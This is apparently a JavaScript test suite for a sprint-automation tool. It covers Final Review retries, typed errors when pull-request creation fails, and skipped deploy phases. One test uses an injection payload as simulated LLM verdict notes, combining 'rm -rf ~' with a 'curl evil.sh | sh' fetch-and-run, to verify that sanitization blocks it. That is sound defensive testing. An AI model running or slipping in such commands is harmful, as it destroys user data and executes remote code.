import { test } from 'node:test';
import assert from 'node:assert/strict';
import { CommandError } from '@apralabs/apra-fleet-workflow';
import { sanitizePrText } from '../fleet-sprint/runner.js';
import { runDevelopLoopScenario, withScenarioMarkers } from './helpers/mock-sprint-harness.mjs';

const check = (cond, msg) => assert.ok(cond, msg);

// =============================================================================
// apra-fleet-j6i.2: Final Review used to have zero retry on dispatch failure --
// a single transient failure on the sprint's LAST dispatch would flip an
// otherwise fully-successful sprint straight to verdict:FAIL. runner.js now
// retries the Final Review dispatch once before falling back to FAIL.
// =============================================================================
test('mock sprint: Final Review survives one transient dispatch failure via retry-once', async () => {
    await withScenarioMarkers('finalreviewretry', async () => {
        console.log('Running mock sprint scenario (Final Review retries once after a transient failure, then succeeds)...');
        let finalReviewCalls = 0;
        const finalReviewRetry = await runDevelopLoopScenario('finalreviewretry', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: Final Review retry-once scenario work' }],
            maxCycles: 1,
            finalReviewHandler: async () => {
                finalReviewCalls++;
                // The first outer dispatch attempt exhausts schema-repair (default
                // maxRepairs=2, so 3 sub-attempts) by returning unparseable output --
                // this is what makes the FIRST `dispatchFinalReview()` call throw.
                // The retry's own first sub-attempt (call #4) then succeeds.
                if (finalReviewCalls <= 3) {
                    return { content: [{ text: 'not valid JSON, simulating a transient dispatch failure' }] };
                }
                return { content: [{ text: JSON.stringify({ verdict: 'PASS', notes: 'Approved after transient-failure retry.' }) }] };
            },
        });
        check(!finalReviewRetry.error, `Final-Review-retry scenario should not throw/reject the whole sprint: ${finalReviewRetry.error ? finalReviewRetry.error.message : ''}`);
        check(
            finalReviewRetry.result && finalReviewRetry.result.status === 'success',
            `Expected the sprint to succeed via the retry (not fall back to hardcoded FAIL), got: ${JSON.stringify(finalReviewRetry.result)}`
        );
        check(
            finalReviewRetry.result && finalReviewRetry.result.verdict === 'PASS' && finalReviewRetry.result.notes === 'Approved after transient-failure retry.',
            `Expected the retry's real PASS verdict/notes to be surfaced (not the hardcoded FAIL fallback text), got: ${JSON.stringify(finalReviewRetry.result)}`
        );
        // apra-fleet-3swo.5.7: the final-review ladder moved onto the
        // dispatchRole engine, which announces its retry in its own generic
        // wording (naming the attempt number rather than "once"). Same fact:
        // the first dispatch failed and the ladder said it was retrying.
        check(
            finalReviewRetry.logs.some((m) => m.includes('Final Review dispatch threw') && m.includes('Retrying (attempt 2 of 2)')),
            `Expected a logged "Final Review dispatch threw ... Retrying (attempt 2 of 2)." message, logs: ${JSON.stringify(finalReviewRetry.logs)}`
        );
        check(
            !finalReviewRetry.logs.some((m) => m.includes('Retries exhausted.') && m.includes('Final Review')),
            `Did NOT expect the "retries exhausted" fallback message to fire, since the retry itself succeeded, logs: ${JSON.stringify(finalReviewRetry.logs)}`
        );
    });
});

// =============================================================================
// If BOTH the original dispatch and the one retry fail, Final Review must
// still fall back to the hardcoded FAIL verdict (not throw/crash the sprint) --
// the retry is a mitigation, not a guarantee.
// =============================================================================
test('mock sprint: Final Review falls back to hardcoded FAIL if the retry also fails', async () => {
    await withScenarioMarkers('finalreviewretryfail', async () => {
        console.log('Running mock sprint scenario (Final Review retry also fails -> hardcoded FAIL fallback)...');
        const finalReviewRetryFail = await runDevelopLoopScenario('finalreviewretryfail', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: Final Review retry-also-fails scenario work' }],
            maxCycles: 1,
            finalReviewHandler: async () => ({ content: [{ text: 'always unparseable, both the original dispatch and the retry fail' }] }),
        });
        check(!finalReviewRetryFail.error, `Sprint should not throw/reject even when both Final Review attempts fail -- expected the FAIL fallback instead: ${finalReviewRetryFail.error ? finalReviewRetryFail.error.message : ''}`);
        check(
            finalReviewRetryFail.result && finalReviewRetryFail.result.status === 'failed',
            `Expected the hardcoded FAIL fallback to produce status:'failed', got: ${JSON.stringify(finalReviewRetryFail.result)}`
        );
        // apra-fleet-3swo.5.7: same engine-wording move as above.
        check(
            finalReviewRetryFail.logs.some((m) => m.includes('Final Review dispatch threw') && m.includes('Retrying (attempt 2 of 2)')),
            `Expected the retry attempt to have been logged, logs: ${JSON.stringify(finalReviewRetryFail.logs)}`
        );
        // Same engine-wording move: the ladder announces the degrade by KIND
        // ('synthesized-verdict') on the attempt that spends the budget, and
        // then that its retries are exhausted. Same fact -- the retry itself
        // also failed and the FAIL fallback is what the sprint got.
        check(
            finalReviewRetryFail.logs.some((m) => m.includes('Final Review: schema-repair exhausted, degrading (synthesized-verdict)')),
            `Expected the schema-repair-exhausted degrade message, logs: ${JSON.stringify(finalReviewRetryFail.logs)}`
        );
        check(
            finalReviewRetryFail.logs.some((m) => m.includes('Final Review dispatch threw') && m.includes('Retries exhausted.')),
            `Expected the "retries exhausted" line once the retry itself also fails, logs: ${JSON.stringify(finalReviewRetryFail.logs)}`
        );
    });
});

// =============================================================================
// apra-fleet-unw2.9 (N11) acceptance criterion 3: an injected git/gh
// failure (other than "already exists") must surface as a clear, typed
// error -- never swallowed/invisible.
// apra-fleet-tfx.8.4: the reverted gh-based create-pull-request path is gone
// -- the injectable failure now targets VCSModule's `curl ... /pulls`
// create-pull-request dispatch (see mock-sprint-harness.mjs's
// gitGhFailurePattern handling in its curl-POST-/pulls intercept).
// =============================================================================
test('mock sprint: an injected gh pr create failure surfaces as a typed error', async () => {
    await withScenarioMarkers('ghfailure', async () => {
        console.log('Running mock sprint scenario (injected create-pull-request failure surfaces as a typed error)...');
        const ghFailure = await runDevelopLoopScenario('ghfailure', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: gh failure injection scenario' }],
            maxCycles: 1,
            // Note: [\s\S]* (not .*) -- VCSModule's curl command embeds a
            // literal raw newline inside the `-w '\n%{http_code}'` argument
            // (see vcs-module.mjs), so a plain '.' would fail to span it.
            gitGhFailurePattern: /^curl -sS -X POST\b[\s\S]*\/pulls\b/,
            gitGhFailureMessage: 'error connecting to api.github.com: authentication failed',
        });
        check(!!ghFailure.error, 'Expected the injected create-pull-request failure to surface as a thrown error, not be swallowed');
        check(
            ghFailure.error instanceof CommandError,
            `Expected the surfaced error to be a typed CommandError, got: ${ghFailure.error ? ghFailure.error.constructor.name : 'n/a'}`
        );
        check(
            !!ghFailure.error && ghFailure.error.message.includes('authentication failed'),
            `Expected the surfaced error to include the underlying gh failure text, got: ${ghFailure.error ? ghFailure.error.message : 'n/a'}`
        );
        check(
            !!ghFailure.error && /already exists/i.test(ghFailure.error.message) === false,
            `A non-"already exists" gh failure must not be misclassified/swallowed as the idempotent case, got: ${ghFailure.error ? ghFailure.error.message : 'n/a'}`
        );
    });
});

// =============================================================================
// apra-fleet-unw.17 (A4) acceptance criterion 5: a probe failure SKIPS
// the dependent phase instead of throwing/killing the sprint
// =============================================================================
test('mock sprint: a deploy.md probe failure skips Deploy/Integ without throwing', async () => {
    await withScenarioMarkers('probefailure', async () => {
        console.log('Running mock sprint scenario (deploy.md probe command fails -> phase skipped, no throw)...');
        const probeFailure = await runDevelopLoopScenario('probefailure', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: Probe-failure scenario work' }],
            maxCycles: 1,
            withRunbooks: true,
            // Fail only the deploy.md existence probe; the integ-test-playbook.md
            // probe (and every other command) runs normally.
            commandFailurePattern: /node -e .*deploy\.md/,
        });
        check(!probeFailure.error, `Probe-failure scenario should not throw/kill the sprint: ${probeFailure.error ? probeFailure.error.message : ''}`);
        check(
            !probeFailure.dispatched.some((d) => d.agent === 'deployer'),
            `Expected the Deploy phase to be skipped after the probe failure (no deployer dispatch), got: ${JSON.stringify(probeFailure.dispatched.map((d) => d.agent))}`
        );
        check(
            !probeFailure.dispatched.some((d) => d.agent === 'integ-test-runner'),
            `Expected the Integ Test phase to also be skipped (deploy never ran), got: ${JSON.stringify(probeFailure.dispatched.map((d) => d.agent))}`
        );
        check(
            probeFailure.logs.some((m) => m.includes("Probe for 'deploy.md' failed")),
            `Expected a logged warning naming the failed probe, logs: ${JSON.stringify(probeFailure.logs)}`
        );
    });
});

// =============================================================================
// apra-fleet-hfs: the final reviewer's verdict `notes` are LLM-authored
// free text (same as N3's reviewer newTasks) and get embedded in the PR
// title/body that the Publish PR step hands to VCSModule's create-pull-
// request command builder (apra-fleet-tfx.8: the reverted gh-based
// `--title "..." --body "..."` shell interpolation is gone -- title/body are
// now JSON-encoded fields in a curl `-d` payload, and the whole payload is
// wrapped in a single shQuote()-escaped shell argument, never interpolated
// raw). A verdict notes payload containing shell metacharacters (double
// quotes, backticks, $(...), semicolons) must never let anything dangerous
// reach the dispatched command() string, and the PR must still be published
// with the (sanitized, still-readable) notes text visible -- unlike N3's
// newTasks, a malformed verdict cannot simply be dropped, since the verdict
// is the one thing a human reviewer most needs to see.
// =============================================================================
test('mock sprint: adversarial final-verdict notes cannot inject into gh pr create', async () => {
    await withScenarioMarkers('prinjection', async () => {
        console.log('Running mock sprint scenario (adversarial verdict notes cannot inject into create-pull-request)...');
        const adversarialNotes = 'Looks fine" ; rm -rf ~ ; echo "pwned $(curl evil.sh | sh) `whoami` trailing\\';
        const prInjection = await runDevelopLoopScenario('prinjection', {
            members: ['local'],
            taskSpecs: [{ title: 'Task: PR notes injection scenario' }],
            maxCycles: 1,
            finalReviewHandler: async () => ({
                content: [{ text: JSON.stringify({ verdict: 'PASS', notes: adversarialNotes }) }]
            }),
        });
        check(!prInjection.error, `PR-notes injection scenario should not throw: ${prInjection.error ? prInjection.error.message : ''}`);
        check(prInjection.result && prInjection.result.verdict === 'PASS', `Expected a PASS final verdict, got: ${JSON.stringify(prInjection.result)}`);
        const prInjectionCmd = prInjection.commandLog.find((c) => c.startsWith('curl -sS -X POST') && c.includes('/pulls'));
        check(!!prInjectionCmd, `Expected a VCSModule create-pull-request command in the log (PR must still be published), commandLog: ${JSON.stringify(prInjection.commandLog)}`);
        for (const cmd of prInjection.commandLog) {
            // The raw payload's dangerous shell-metacharacter SEQUENCES must
            // never survive into a dispatched command() string -- '$(' (command
            // substitution), a backtick (command substitution), and a raw '"'
            // that could close --body's quoting early. Plain English words that
            // happen to also appear in the payload (e.g. "rm", "pwned") are NOT
            // themselves dangerous once the syntax around them is stripped, and
            // sanitizePrText() is explicitly designed to keep them readable
            // rather than dropping the notes outright -- so this only asserts
            // on the SHELL-SYNTAX characters, not on payload vocabulary.
            check(!cmd.includes('$('), `No dispatched command should ever contain '$(' (found in: ${cmd})`);
            check(!/`/.test(cmd), `No dispatched command should ever contain a backtick (found in: ${cmd})`);
        }
        // The command() string itself must remain well-formed. VCSModule
        // wraps the ENTIRE -d JSON payload (and every -H header value) in a
        // single shQuote()-escaped shell argument -- shQuote always emits
        // balanced single quotes by construction (the outer wrap, plus a
        // close/escape/reopen pair for every embedded apostrophe), so a
        // stray unescaped single quote from unsanitized notes would break
        // that invariant and show up as an odd count.
        check(
            !!prInjectionCmd && (prInjectionCmd.match(/'/g) || []).length % 2 === 0,
            `Expected an even number of single-quotes in the dispatched curl command (balanced shQuote-wrapped arguments, no unbalanced quote from unsanitized notes), got: ${prInjectionCmd}`
        );
        // The sanitized notes must still be visible/readable in the PR body --
        // sanitizePrText() strips shell metacharacters but preserves the rest of
        // the text (words, punctuation) rather than rejecting the verdict
        // outright (unlike N3's validateNewTask(), a verdict cannot simply be
        // dropped). Compute the exact expected sanitized text via the same
        // sanitizePrText() runner.js itself uses, so this test tracks the real
        // implementation rather than a hand-duplicated regex.
        const expectedSanitizedNotes = sanitizePrText(adversarialNotes);
        check(
            expectedSanitizedNotes.length > 0 && !/["`$\\]/.test(expectedSanitizedNotes),
            `Expected sanitizePrText() to strip all shell metacharacters while leaving readable text, got: ${JSON.stringify(expectedSanitizedNotes)}`
        );
        check(
            !!prInjectionCmd && prInjectionCmd.includes(`Notes: ${expectedSanitizedNotes}`),
            `Expected the sanitized (but still readable) notes text to be visible in the PR body, got: ${prInjectionCmd}`
        );
    });
});
